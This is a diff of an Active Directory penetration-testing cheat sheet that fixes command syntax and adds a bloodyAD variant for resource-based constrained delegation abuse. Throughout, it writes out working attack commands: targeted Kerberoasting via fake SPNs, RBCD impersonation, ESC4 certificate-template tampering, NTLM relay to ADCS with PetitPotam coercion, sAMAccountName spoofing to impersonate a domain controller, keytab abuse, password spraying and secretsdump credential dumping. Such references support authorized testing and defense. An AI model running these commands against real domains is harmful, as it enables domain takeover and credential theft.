@@ -570,7 +570,7 @@ netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --users
 netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --groups
 
 # Computers
-netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --computers
+netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --query "(objectClass=computer)" "dNSHostName operatingSystem"
 
 # Password policy (check lockout threshold before spraying!)
 netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --pass-pol
@@ -1104,8 +1104,8 @@ klist -k /etc/krb5.keytab    # list principals in the keytab
 kinit -k -t /etc/krb5.keytab '<PRINCIPAL>'    # e.g., host/server.domain.com@DOMAIN.COM
 klist
 
-# From attacker box — impacket-getTGT with keytab
-impacket-getTGT '<DOMAIN>/<USER>' -keytab /path/to/stolen.keytab -dc-ip <DC_IP>
+# From attacker box — getTGT has no -keytab flag; extract the key, pass -aesKey / -hashes
+impacket-getTGT '<DOMAIN>/<USER>' -aesKey <AES256_HEX_FROM_KEYTAB> -dc-ip <DC_IP>
 export KRB5CCNAME=<USER>.ccache
 ```
 
@@ -1387,7 +1387,8 @@ hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
 **Exploit — manual (when targetedKerberoast.py isn't available or fails):**
 ```bash
 # 1. Set a fake SPN on the victim (any non-existent SPN works — KDC just needs the attribute populated)
-impacket-addspn -u '<DOMAIN>\\<USER>' -p '<PASSWORD>' -t '<TARGET_USER>' -s 'fake/svc' '<DC_FQDN>'
+# addspn.py ships with krbrelayx (dirkjanm/krbrelayx), NOT impacket
+addspn.py -u '<DOMAIN>\\<USER>' -p '<PASSWORD>' -t '<TARGET_USER>' -s 'fake/svc' '<DC_FQDN>'
 # Or via bloodyAD:
 bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' add uac '<TARGET_USER>' -f
 bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' set object '<TARGET_USER>' servicePrincipalName -v 'fake/svc'
@@ -1397,7 +1398,7 @@ impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request-user '
 hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
 
 # 3. CLEANUP — remove the SPN (otherwise the victim is permanently SPN'd and trivially roastable by anyone)
-impacket-addspn -u '<DOMAIN>\\<USER>' -p '<PASSWORD>' -t '<TARGET_USER>' -s 'fake/svc' '<DC_FQDN>' -r
+addspn.py -u '<DOMAIN>\\<USER>' -p '<PASSWORD>' -t '<TARGET_USER>' -s 'fake/svc' '<DC_FQDN>' -r
 # Or:
 bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' remove object '<TARGET_USER>' servicePrincipalName -v 'fake/svc'
 ```
@@ -1851,6 +1852,26 @@ impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action 'flush' '<DOMAIN>/<USER>
 impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -computer-name 'FAKEPC$' -delete -dc-ip <DC_IP>
 ```
 
+**bloodyAD variant (single CLI for steps 1–2 + verify):**
+```bash
+# 1. Create the computer account (hostname WITHOUT trailing $; skip if you already control one)
+bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' add computer 'FAKEPC' 'FakeP@ss123'
+
+# 2. Write the RBCD link — `add rbcd <target> <service>` sets msDS-AllowedToActOnBehalfOfOtherIdentity
+#    target = victim computer to impersonate ON;  service = account you control that gets to impersonate
+bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' add rbcd '<TARGET_COMPUTER>$' 'FAKEPC$'
+
+# Verify / read it back
+bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' get object '<TARGET_COMPUTER>$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity
+
+# Auth variants: -k (Kerberos; ccache via $KRB5CCNAME) instead of -p; PtH = -p 'LMHASH:NTHASH' (e.g. ':<NT_HASH>')
+
+# Cleanup — remove the RBCD link, then the computer
+bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' remove rbcd '<TARGET_COMPUTER>$' 'FAKEPC$'
+bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' remove object 'FAKEPC$'
+```
+> Then run steps 3–4 above (`impacket-getST` S4U + use the ticket) — bloodyAD handles the LDAP writes, not the S4U ticket request. Verb syntax confirmed against the bloodyAD User Guide (`add computer hostname newpass`, `add rbcd target service`).
+
 **Attack chain (Rubeus / PowerShell — from Windows foothold):**
 ```powershell
 # 1. Create a fake computer with Powermad
@@ -2209,10 +2230,10 @@ certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <DOMAIN>
 ### 6.3 ESC4 — Vulnerable Certificate Template ACLs
 If you have write access to a certificate template, modify it to be ESC1-vulnerable:
 ```bash
-# Save original template, modify for ESC1, exploit, then restore
-certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -save-old
+# Save original config, modify for ESC1, exploit, then restore (Certipy v5 flags)
+certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -save-configuration old_template.json
 # Template is now ESC1 → exploit as above
-# Restore: certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -configuration old_template.json
+# Restore: certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -write-configuration old_template.json
 ```
 
 ### 6.4 ESC8 — NTLM Relay to ADCS Web Enrollment
@@ -2256,8 +2277,8 @@ certipy-ad auth -pfx user.pfx -dc-ip <DC_IP>
 export KRB5CCNAME=user.ccache
 impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC_FQDN>
 
-# Skip S4U2self self-ticket request (some forests block it; useful for machine accounts)
-certipy-ad auth -pfx machine.pfx -dc-ip <DC_IP> -no-s4u2self
+# Machine-account UnPAC-the-hash: certipy v5 has no -no-s4u2self flag; use -username/-domain context
+certipy-ad auth -pfx machine.pfx -dc-ip <DC_IP> -username '<MACHINE>$' -domain <DOMAIN>
 
 # Force username/domain when the SAN doesn't match (e.g. cert for a UPN that differs)
 certipy-ad auth -pfx user.pfx -username '<USER>' -domain '<DOMAIN>' -dc-ip <DC_IP>
@@ -2328,7 +2349,7 @@ impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ss123!' \
   '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC_HOSTNAME> -dc-ip <DC_IP>
 
 # Step 2 — rename the machine account so its sAMAccountName matches the DC's name (no trailing $)
-impacket-renameMachine -current-name 'EVIL$' -new-name 'DC' \
+renameMachine.py -current-name 'EVIL$' -new-name 'DC' \
   '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 # DC now sees TWO principals named 'DC' — ours (with no SPNs) and the real DC
 
@@ -2337,7 +2358,7 @@ impacket-getTGT '<DOMAIN>/DC:P@ss123!' -dc-ip <DC_IP>
 # Produces DC.ccache
 
 # Step 4 — rename our machine account back to its original name (avoid SAM collision detection)
-impacket-renameMachine -current-name 'DC$' -new-name 'EVIL$' \
+renameMachine.py -current-name 'DC$' -new-name 'EVIL$' \
   '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 
 # Step 5 — S4U2self impersonation: request a service ticket to cifs/<DC_FQDN> AS the spoofed 'DC$'
@@ -2481,7 +2502,7 @@ certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable 
 
 # 2. Coerce + relay to RPC enrollment
 # Start relay targeting the CA's RPC endpoint
-impacket-ntlmrelayx -t 'rpc://<CA_IP>' -rpc-mode icpr -icpr-ca-name '<CA_NAME>' -smb2support
+impacket-ntlmrelayx -t 'rpc://<CA_IP>' -rpc-mode ICPR -icpr-ca-name '<CA_NAME>' -smb2support
 
 # 3. Trigger coercion (PetitPotam, PrinterBug, DFSCoerce)
 python3 PetitPotam.py <RELAY_LISTENER_IP> <DC_IP>
@@ -2599,7 +2620,7 @@ ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
 # Pick a template whose ACL you can already write (or grant yourself WriteProperty via ACL chain).
 # 1. Add your account to enrollment rights:
 certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> \
-    -template '<TEMPLATE_NAME>' -save-old
+    -template '<TEMPLATE_NAME>' -save-configuration <TEMPLATE_NAME>.json
 # This dumps current template config to <TEMPLATE_NAME>.json. Edit it to make it ESC1-vulnerable:
 #   "msPKI-Certificate-Name-Flag": -1593835519   (bit 0x1 = ENROLLEE_SUPPLIES_SUBJECT)
 #   "pKIExtendedKeyUsage": ["1.3.6.1.5.5.7.3.2"]   (Client Authentication)
@@ -4187,7 +4208,7 @@ Reanimate-Tombstones  → Restore-ADObject — resurrect deleted user (Phase 4.9
 | User enumeration (no creds) | `kerbrute userenum` | `kerbrute.exe userenum` |
 | AS-REP Roast | `impacket-GetNPUsers` | `Rubeus.exe asreproast` |
 | Kerberoast | `impacket-GetUserSPNs` | `Rubeus.exe kerberoast` |
-| Password spray | `netexec smb/ldap`, `kerbrute passwordspray` | `Rubeus.exe brute` *(community-forked builds only — not in mainline Rubeus; use `Invoke-DomainPasswordSpray.ps1` for a universally-available alternative)* |
+| Password spray | `netexec smb/ldap`, `kerbrute passwordspray` | `Rubeus.exe brute` (alias `spray`; mainline) |
 | BloodHound collection | `bloodhound-ce-python -c all` | `SharpHound.exe -c All` |
 | LDAP enumeration | `ldapsearch`, `ldapdomaindump` | `PowerView`, `ADModule` |
 | SMB enumeration | `netexec smb --shares/--users` | `PowerView Get-NetShare` |
